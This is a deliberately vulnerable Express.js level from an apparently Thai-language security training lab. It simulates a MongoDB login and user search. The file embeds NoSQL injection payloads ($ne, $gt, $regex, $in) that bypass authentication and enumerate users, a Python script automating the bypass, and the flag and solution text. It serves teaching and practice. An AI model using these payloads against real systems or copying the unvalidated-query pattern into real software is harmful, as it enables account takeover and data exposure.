/**
 * LEVEL 10 - NOSQL INJECTION
 * ความยาก: ★★★★★★★★★★
 *
 * จุดอ่อน: ระบบใช้ MongoDB-style query แต่รับ JSON object จาก user โดยตรง
 *          ทำให้สามารถแทรก operator เช่น $gt, $ne, $regex เพื่อ bypass logic ได้
 * กลไกการป้องกัน: ดูเหมือนไม่มี SQL — แต่ NoSQL ก็ inject ได้เหมือนกัน!
 * วิธีผ่าน: ใช้ MongoDB query operators แทนที่ค่า string ปกติ
 *
 * ✅ สามารถรันเป็น standalone ได้: node lab/levels/level10.js
 * 🚀 Port: 8110
 */

const express = require("express");
const router = express.Router();

const SECRET_FLAG = "FLAG{nosql_injection_10_operator_abuse}";

// ── จำลอง MongoDB-style "ฐานข้อมูล" ─────────────────────────────────
const fakeDB = {
  users: [
    {
      _id: "1",
      username: "admin",
      password: "Sup3rS3cr3t!",
      role: "admin",
      flag: SECRET_FLAG,
    },
    {
      _id: "2",
      username: "alice",
      password: "alice_pass_99",
      role: "user",
      flag: null,
    },
    {
      _id: "3",
      username: "bob",
      password: "b0bSecure#",
      role: "user",
      flag: null,
    },
    {
      _id: "4",
      username: "charlie",
      password: "ch@rlie2024",
      role: "mod",
      flag: null,
    },
  ],
};

// จำลอง MongoDB findOne — รองรับ operators: $eq $ne $gt $lt $gte $lte $regex $in
function mongoFindOne(collection, query) {
  return collection.find((doc) => matchQuery(doc, query)) || null;
}

function matchQuery(doc, query) {
  for (const [key, condition] of Object.entries(query)) {
    const docVal = doc[key];

    if (
      condition !== null &&
      typeof condition === "object" &&
      !Array.isArray(condition)
    ) {
      // operator mode
      for (const [op, opVal] of Object.entries(condition)) {
        switch (op) {
          case "$eq":
            if (!(docVal == opVal)) return false;
            break;
          case "$ne":
            if (!(docVal != opVal)) return false;
            break;
          case "$gt":
            if (!(docVal > opVal)) return false;
            break;
          case "$lt":
            if (!(docVal < opVal)) return false;
            break;
          case "$gte":
            if (!(docVal >= opVal)) return false;
            break;
          case "$lte":
            if (!(docVal <= opVal)) return false;
            break;
          case "$in":
            if (!opVal.includes(docVal)) return false;
            break;
          case "$regex":
            try {
              if (!new RegExp(opVal).test(String(docVal))) return false;
            } catch {
              return false;
            }
            break;
          default:
            return false;
        }
      }
    } else {
      // plain equality
      if (docVal !== condition) return false;
    }
  }
  return true;
}

// ── Routes ────────────────────────────────────────────────────────

// ❌ จุดอ่อน: รับ JSON body แล้วส่งตรงเข้า query โดยไม่ validate type
router.post(
  "/login",
  express.json(),
  express.urlencoded({ extended: true }),
  (req, res) => {
    let username = req.body.username;
    let password = req.body.password;

    // พยายาม parse เป็น object ถ้าเป็น JSON string (จำลอง framework ที่ auto-parse)
    try {
      if (typeof username === "string" && username.startsWith("{")) {
        username = JSON.parse(username);
      }
      if (typeof password === "string" && password.startsWith("{")) {
        password = JSON.parse(password);
      }
    } catch (_) {}

    if (!username || !password) {
      return res.json({
        success: false,
        message: "กรุณากรอก username และ password",
      });
    }

    // ❌ ส่ง user input เข้า query โดยตรง — NoSQL Injection!
    const user = mongoFindOne(fakeDB.users, { username, password });

    if (user) {
      const response = {
        success: true,
        message: `ยินดีต้อนรับ ${user.username}!`,
        role: user.role,
      };
      if (user.flag) {
        response.flag = user.flag;
      }
      return res.json(response);
    }

    res.json({
      success: false,
      message: "❌ Username หรือ Password ไม่ถูกต้อง",
    });
  },
);

// endpoint สำหรับ search user (จุดอ่อนที่ 2: $regex injection)
router.get("/users/search", (req, res) => {
  let q = req.query.q || "";

  // พยายาม parse เป็น object
  try {
    if (q.startsWith("{")) q = JSON.parse(q);
  } catch (_) {}

  // ❌ ใช้ค่า q เป็น regex pattern โดยตรง
  const results = fakeDB.users
    .filter((u) => {
      try {
        if (typeof q === "object") {
          return matchQuery(u, { username: q });
        }
        return new RegExp(q, "i").test(u.username);
      } catch {
        return false;
      }
    })
    .map((u) => ({ _id: u._id, username: u.username, role: u.role }));

  res.json({ count: results.length, users: results });
});

router.get("/", (req, res) => {
  res.send(`
    <html>
    <head>
      <title>Level 10 - NoSQL Injection</title>
      <style>
        body { max-width:700px; margin:50px auto; font-family:monospace; }
        pre  { background:#1e1e1e; color:#d4d4d4; padding:15px; border-radius:6px; overflow-x:auto; }
        code { background:#f0f0f0; padding:2px 6px; border-radius:3px; }
        .box { padding:15px; border-radius:4px; margin:15px 0; }
        .warn { background:#fff3cd; }
        .danger { background:#f8d7da; }
        .info  { background:#d1ecf1; }
        input  { padding:8px; width:100%; box-sizing:border-box; margin-bottom:8px; }
        button { padding:8px 20px; background:#0e639c; color:#fff; border:none; cursor:pointer; border-radius:4px; }
        #result { margin-top:12px; }
      </style>
    </head>
    <body>
      <h1>🍃 LEVEL 10</h1>
      <h3>NoSQL Injection</h3>
      <hr>
      <p>ระบบนี้ใช้ <strong>NoSQL</strong> (MongoDB-style) — ไม่มี SQL เลย!</p>
      <p>แต่ถ้า framework รับ JSON object เข้า query โดยตรง...</p>
      <p>Query operators อย่าง <code>$ne</code>, <code>$gt</code>, <code>$regex</code> จะกลายเป็นอาวุธ</p>

      <h4>🔐 Login</h4>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:15px;">
        <div>
          <p><strong>ปกติ (JSON body):</strong></p>
          <input id="username" placeholder='username หรือ {"$ne": ""}' value="admin">
          <input id="password" placeholder='password หรือ {"$ne": ""}' value="wrongpassword">
          <button onclick="doLogin()">Login</button>
        </div>
        <div>
          <p><strong>Raw JSON body:</strong></p>
          <textarea id="rawJson" rows="4"
            style="width:100%;box-sizing:border-box;padding:8px;font-family:monospace;font-size:0.85em;"
          >{
  "username": "admin",
  "password": {"$ne": ""}
}</textarea>
          <button onclick="doLoginRaw()" style="margin-top:4px;">Send Raw JSON</button>
        </div>
      </div>

      <div id="result"></div>

      <hr>
      <h4>🔍 User Search (<code>$regex</code> injection)</h4>
      <div style="display:flex;gap:8px;">
        <input id="searchQ" placeholder='search term หรือ {"$regex":".*"}' style="margin:0;">
        <button onclick="doSearch()" style="white-space:nowrap;">ค้นหา</button>
      </div>
      <div id="searchResult" style="margin-top:10px;"></div>

      <div class="box warn" style="margin-top:20px;">
        <strong>Hint — วิธีโจมตี Login:</strong><br>
        แทนที่จะส่ง <code>password = "mypassword"</code><br>
        ส่ง <code>password = {"$ne": ""}</code><br>
        → query กลายเป็น: WHERE password != "" → true ทุก user!<br><br>
        หรือใช้ <code>{"$gt": ""}</code>, <code>{"$regex": ".*"}</code>
      </div>

      <div class="box danger">
        <strong>Hint — วิธีโจมตี Search:</strong><br>
        ค้นหาด้วย <code>{"$regex":"a"}</code> → ดู user ทั้งหมดที่มีตัว a<br>
        ค้นหาด้วย <code>{"$regex":".*"}</code> → ดู user ทั้งหมด!
      </div>

      <details style="margin-top:15px;">
        <summary style="cursor:pointer;font-weight:bold;">💡 Payloads ทั้งหมด</summary>
        <pre>
// ── Login Bypass ──────────────────────────────────

// 1. ใช้ $ne (not equal) — password ต้องไม่เท่ากับ ""
POST /login
{ "username": "admin", "password": { "$ne": "" } }

// 2. ใช้ $gt — password > "" → true เสมอ (string comparison)
{ "username": "admin", "password": { "$gt": "" } }

// 3. ใช้ $regex — match ทุกอย่าง
{ "username": "admin", "password": { "$regex": ".*" } }

// 4. ไม่รู้ username ก็ได้ — bypass ทั้งคู่
{ "username": { "$ne": "" }, "password": { "$ne": "" } }

// 5. $in — เดา password
{ "username": "admin", "password": { "$in": ["Sup3rS3cr3t!", "admin123"] } }


// ── Search $regex Injection ───────────────────────

// ค้นหาทุก user
GET /users/search?q={"$regex":".*"}

// ค้นหา user ที่ขึ้นต้นด้วย a
GET /users/search?q={"$regex":"^a"}
        </pre>

        <details style="margin-top:10px;">
          <summary style="cursor:pointer;">🐍 Python automation</summary>
          <pre>
import requests, json

BASE = "http://localhost:8110"

# Login bypass ด้วย $ne
r = requests.post(f"{BASE}/login",
    json={"username": "admin", "password": {"$ne": ""}})
print(r.json())

# Search ทุก user ด้วย $regex
r = requests.get(f"{BASE}/users/search",
    params={"q": json.dumps({"$regex": ".*"})})
print(r.json())
          </pre>
        </details>
      </details>

      <script>
        const resultEl = document.getElementById("result");
        const searchEl = document.getElementById("searchResult");

        async function doLogin() {
          let u = document.getElementById("username").value;
          let p = document.getElementById("password").value;
          try { u = JSON.parse(u); } catch(_) {}
          try { p = JSON.parse(p); } catch(_) {}

          const r = await fetch("/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username: u, password: p })
          });
          const data = await r.json();
          showResult(resultEl, data);
        }

        async function doLoginRaw() {
          const raw = document.getElementById("rawJson").value;
          try {
            const body = JSON.parse(raw);
            const r = await fetch("/login", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(body)
            });
            const data = await r.json();
            showResult(resultEl, data);
          } catch(e) {
            resultEl.innerHTML = '<div style="color:red;">❌ JSON ไม่ถูกต้อง</div>';
          }
        }

        async function doSearch() {
          let q = document.getElementById("searchQ").value;
          const r = await fetch("/users/search?q=" + encodeURIComponent(q));
          const data = await r.json();
          searchEl.innerHTML = "<pre style='background:#1e1e1e;color:#4ec9b0;padding:12px;border-radius:4px;'>"
            + JSON.stringify(data, null, 2) + "</pre>";
        }

        function showResult(el, data) {
          const color = data.success ? "#d4edda" : "#f8d7da";
          let html = \`<div style="background:\${color};padding:12px;border-radius:4px;margin-top:10px;">
            <pre style="margin:0;">\${JSON.stringify(data, null, 2)}</pre>
          </div>\`;
          if (data.flag) {
            html += \`<div style="background:#d4edda;padding:15px;border-radius:4px;margin-top:8px;font-size:1.1em;">
              🎉 <strong>\${data.flag}</strong>
            </div>\`;
          }
          el.innerHTML = html;
        }
      </script>
    </body>
    </html>
  `);
});

// ✅ Standalone Server
if (require.main === module) {
  const app = express();
  app.use("/", router);

  const PORT = 8110;
  app.listen(PORT, () => {
    console.log("\n=========================================");
    console.log("🍃 LEVEL 10 - NoSQL Injection");
    console.log("=========================================");
    console.log(`✅ RUNNING at: http://localhost:${PORT}`);
    console.log(`💡 วิธีผ่าน: POST /login ด้วย password: {\"$ne\": \"\"}`);
    console.log(`🎯 เป้าหมาย: login เป็น admin เพื่อรับ FLAG`);
    console.log("=========================================\n");
  });
}

module.exports = {
  router,
  info: {
    level: 10,
    port: 8110,
    name: "NoSQL Injection",
    vulnerability: "MongoDB operator injection via unsanitized JSON input",
    difficulty: 10,
    exploit_hint:
      'POST /login ด้วย { "username": "admin", "password": { "$ne": "" } }',
    mitigation:
      "Validate type ของ input — ถ้า expect string ให้ reject object, ใช้ schema validation (Joi/Zod)",
    solution:
      "ใช้ $ne, $gt, หรือ $regex operator แทน password string เพื่อ bypass authentication",
  },
};
